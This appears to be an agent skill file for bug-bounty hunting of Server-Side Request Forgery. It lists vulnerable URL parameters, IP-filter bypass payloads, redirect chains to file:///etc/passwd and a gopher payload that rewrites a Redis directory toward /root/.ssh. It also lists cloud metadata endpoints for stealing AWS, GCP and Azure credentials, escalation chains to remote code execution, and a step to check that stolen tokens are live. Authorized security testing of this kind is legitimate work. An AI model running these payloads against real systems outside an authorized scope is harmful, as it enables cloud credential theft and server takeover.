---
name: hunt-ssrf
description: |
  Server-Side Request Forgery hunting methodology. Cloud metadata endpoint attacks
  for AWS, GCP, and Azure. Internal service fingerprinting, IP/URL bypass techniques,
  redirect-based SSRF, blind SSRF validation with strict OOB confirmation rules.
triggers:
  - hunt ssrf
  - test for ssrf
  - server-side request forgery
  - blind ssrf
  - cloud metadata
  - url injection
  - fetch url
  - server side request forgery
category: security
---
# SSRF Hunting Methodology

Adapted from Claude-BugHunter by ElementalSouls.  
**Source:** 9 public HackerOne reports — systematic SSRF hunting.

---

## Crown Jewel Targets (Highest Value)

| Target Type | Why High Value |
|---|---|
| **Cloud-hosted SaaS** | GCP metadata (`169.254.169.254` / `metadata.google.internal`), AWS IMDSv1 |
| **Kubernetes/orchestration** | Aggregated API servers, kubelet endpoints, metrics-server |
| **Internal developer tooling** | CI/CD, workflow orchestration (Flyte, Argo), admin panels |
| **Link preview / URL fetching APIs** | Reddit-style preview APIs, Slack-style unfurling, media processors |
| **Dataset/file import pipelines** | Remote URL fetching on behalf of users |
| **Enterprise self-hosted** | GitHub Enterprise, GitLab — SSRF chains to RCE |

**Highest payouts:** Cloud credentials → account takeover, internal admin APIs → data exfil, or chains to RCE.

---

## OOB-Or-It-Didn't-Happen Gate (Critical Rule)

> **"Claims of blind SSRF require an out-of-band (OOB) confirmation. Always. No exceptions."**

### What is NOT Confirmation
- Server **echoing your URL back in an error message** — this is string formatting, not network request
- Different status codes for external URL vs `localhost` — can come from validators, not fetching
- Delayed response — can come from DNS resolution attempts, not completed HTTP fetches

### What IS Confirmation
- DNS lookup for your unique Collaborator subdomain appears in OOB listener
- HTTP request to your Collaborator endpoint with server's source IP and User-Agent
- For JS-execution contexts (PDF renderers, headless browsers): fetch from server to callback URL

### Default Workflow
1. **Plant Collaborator subdomain first** (sub-tag per sink: `dlsrcurl.`, `import.`, etc.)
2. **Send request** to target endpoint
3. **Wait 30–120 seconds**, poll OOB listener
4. **Only after confirmed callback** claim SSRF
5. Zero callbacks = retract claims, even if URLs echoed

---

## Attack Surface Signals

### URL Patterns to Hunt
```
/api/*/preview      /api/*/fetch        /api/*/import       /api/*/webhook
/api/*/proxy        /api/*/render       /api/*/link         /api/*/screenshot
/api/*/export       /api/*/validate
?url=               ?uri=               ?endpoint=          ?redirect=
?src=               ?source=            ?feed=              ?host=
?target=            ?dest=              ?file=              ?path=
?callback=          ?image=             ?load=              ?fetch=
?next=              ?return=            ?referer=           ?page=
?document=          ?folder=            ?template=          ?preview=
```

### JS Patterns (in client-side code)
```javascript
fetch(userInput)
axios.get(params.url)
XMLHttpRequest + variable URL
url: req.body.url
src: params.source
href: query.endpoint
```

### Response Header Signals
- `X-Forwarded-For` headers echoed back
- `Server: internal-service`
- `Via: 1.1 internal-proxy`
- `X-Cache` headers revealing internal hostnames

### Tech Stack Signals
- **Kubernetes** — public-facing aggregated API, metrics endpoints
- **GCP** — URL-fetching services on Compute Engine/GKE
- **Node.js/Python** with `requests`, `node-fetch`, `axios`
- **Headless browsers** (Puppeteer, PhantomJS) — extremely high value
- **XML/DSPL/CSV import features** — XXE-style SSRF vector
- **OAuth/webhook registration** endpoints

---

## Step-by-Step Hunting Methodology

### 1. Map All URL-Input Parameters
- Spider JS files for fetch calls
- Check all API docs
- Look for file-import, link-preview, webhook, image-proxy, redirect features
- Document every parameter that accepts a URL, URI, path, or hostname

### 2. Set Up OOB Detection Server
- Burp Collaborator, interactsh, or canarytokens.org
- Need unique per-test DNS/HTTP callback domain
- Tag each test point: `dlsrcurl.`, `import.`, `proxy.`, `img.` — so you know which parameter triggered the callback

### 3. Send Callback URL First (Blind SSRF Check)
```
url=https://YOUR.interactsh.com/test
```
**Confirm outbound connection before attempting internal targets.**

### 4. Test Internal Cloud Metadata Endpoints
```bash
# GCP
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google

# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
http://169.254.169.254/metadata/instance
Header: Metadata: true
```

### 5. Test Localhost and Common Internal Ports
```
http://localhost/
http://127.0.0.1:8080/
http://127.0.0.1:6443/    # Kubernetes API
http://127.0.0.1:2379/    # etcd
http://127.0.0.1:9090/    # Prometheus
http://127.0.0.1:9200/    # Elasticsearch
http://127.0.0.1:3000/    # Grafana
http://127.0.0.1:6379/    # Redis
http://127.0.0.1:27017/   # MongoDB
http://127.0.0.1:2375/    # Docker API (unauthenticated)
http://127.0.0.1:5432/    # PostgreSQL
```

### 6. Check for Redirect-Based SSRF
If endpoint validates initial URL but follows 30x redirects, host a redirect server pointing to internal addresses:
1. Your domain → 302 → `http://169.254.169.254/latest/meta-data/`
2. Your domain → 302 → `file:///etc/passwd`
3. Your domain → 302 → `gopher://internal-redis:6379/_CONFIG%20SET%20dir%20/root/.ssh/`

### 7. Test JavaScript-Execution Contexts
For PDF renderers, headless browsers, screenshot services:
```html
<script>fetch('http://YOUR.interactsh.com')</script>
<img src=x onerror="fetch('http://YOUR.interactsh.com')">
```
Check for callback from server's browser context.

### 8. Test DNS Rebinding
- Use services like `1u.ms`, `nip.io`, `sslip.io`
- `169.254.169.254.nip.io` → 169.254.169.254
- `127.0.0.1.nip.io` → 127.0.0.1

---

## IP Address Bypass Techniques

All of these resolve to 127.0.0.1 or localhost:

| Technique | Payload |
|---|---|
| Decimal | `http://2130706433` |
| Octal | `http://0177.0.0.1` |
| Hex | `http://0x7f.0x0.0x0.0x1` |
| Short form | `http://127.1` |
| IPv6 | `http://[::1]` |
| IPv4-mapped IPv6 | `http://[::ffff:127.0.0.1]` |
| DNS | `http://localhost` |
| CIDR zero | `http://0/` |
| DNS rebinding | `http://169.254.169.254.nip.io` |
| Unicode | `http://①②⑦.⓪.⓪.①` |

---

## Cloud Metadata Deep Dive

### AWS
```
# Base metadata
http://169.254.169.254/latest/meta-data/

# IAM role credentials (if assigned)
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get a specific role's credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# User data (startup scripts, configs)
http://169.254.169.254/latest/user-data/

# Instance identity document
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### GCP
```
# Base
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google

# Default service account token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

# Scopes
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
Header: Metadata-Flavor: Google
```

### Azure
```
# Instance metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Managed identity token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

---

## Chain Scenarios

| Entry Point | Step 2 | Escalation |
|---|---|---|
| SSRF to GCP metadata | Extract access token | Use token to access GCP APIs, Cloud Storage, GKE |
| SSRF to AWS IMDS | Extract IAM credentials | Use AWS CLI to enumerate S3, EC2, Lambda |
| SSRF to internal Redis | `CONFIG SET dir /root/.ssh/` | Write SSH key → RCE |
| SSRF to kubelet (port 10250) | Execute commands on pods | Pod escape, cluster compromise |
| SSRF to Elasticsearch | Query internal indices | Exfil sensitive business data |
| SSRF to metadata → token | Token has wrong scope | Still chained to data access |

---

## Validation Checklist

Before reporting an SSRF:

- [ ] OOB callback confirmed (DNS or HTTP to your listener)
- [ ] Internal service returned actual data (not just connection confirmation)
- [ ] For cloud metadata: you extracted credentials/token, verified they're live
- [ ] For redirect-based: you controlled the redirect server, not the target
- [ ] Impact clearly articulated — what can attacker DO with this access
- [ ] Not just "DNS callback only" with no data returned (low/borderline)
- [ ] Retested from fresh session without prior cookies/cache
